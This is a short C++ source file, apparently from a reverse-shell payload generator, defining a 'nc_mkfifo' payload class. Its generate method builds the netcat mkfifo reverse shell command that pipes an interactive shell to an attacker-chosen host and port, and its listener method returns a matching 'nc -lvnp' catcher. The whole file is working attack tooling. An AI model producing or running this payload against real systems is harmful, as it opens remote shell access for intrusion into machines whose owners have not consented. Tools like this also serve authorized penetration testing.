#include "Nc_Mkfifo_Payload.h"
#include "../../listeners/ListenerFactory.h"

std::string NcMkfifoPayload::name() const {
return "nc_mkfifo";
}

std::string NcMkfifoPayload::generate(const Options& opts) const {
    return "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|" + opts.interpreter + " -i 2>&1|nc " + opts.host + " " + std::to_string(opts.port) + " >/tmp/f";
}

std::string NcMkfifoPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}